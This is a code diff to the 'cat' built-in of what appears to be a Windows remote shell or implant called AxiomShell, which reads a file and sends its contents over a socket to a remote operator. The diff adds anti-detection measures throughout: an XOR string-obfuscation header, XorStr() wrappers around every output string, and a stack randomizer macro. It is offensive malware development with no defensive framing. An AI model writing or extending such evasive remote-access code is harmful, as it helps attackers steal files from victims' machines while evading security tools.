@@ -1,7 +1,9 @@
 #include "AxiomShell.h"
+#include "autoxor.h"
 
 BOOL BUILTIN_cat(SOCKET sock, size_t argc, char **argv)
 {
+	STACK_RANDOMIZER;
 	HANDLE hFile;
 	CHAR buffer[4096];
 	SIZE_T read_count;
@@ -13,7 +15,7 @@ BOOL BUILTIN_cat(SOCKET sock, size_t argc, char **argv)
 
 	if (argc !=1)
 	{
-		JSON_send_packets(JsonCommandOutput, sock, (void *)"[!] Usage: cat {PATH}\n");
+		JSON_send_packets(JsonCommandOutput, sock, (void *)XorStr("[!] Usage: cat {PATH}\n"));
 		return (FALSE);
 	}
 
@@ -29,7 +31,7 @@ BOOL BUILTIN_cat(SOCKET sock, size_t argc, char **argv)
 	);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
-		JSON_send_packets(JsonCommandOutput, sock, (void *)"[!] File not found or permission denied\n");
+		JSON_send_packets(JsonCommandOutput, sock, (void *)XorStr("[!] File not found or permission denied\n"));
 		return (FALSE);
 	}
 
@@ -37,7 +39,7 @@ BOOL BUILTIN_cat(SOCKET sock, size_t argc, char **argv)
 	filesizeLow = GetFileSize(hFile, &filesizeHigh);
 	if (filesizeLow == INVALID_FILE_SIZE)
 	{
-		JSON_send_packets(JsonCommandOutput, sock, (void*)"[!] Failed to get the file size, aborting\n");
+		JSON_send_packets(JsonCommandOutput, sock, (void*)XorStr("[!] Failed to get the file size, aborting\n"));
 		CloseHandle(hFile);
 		return (FALSE);
 	}
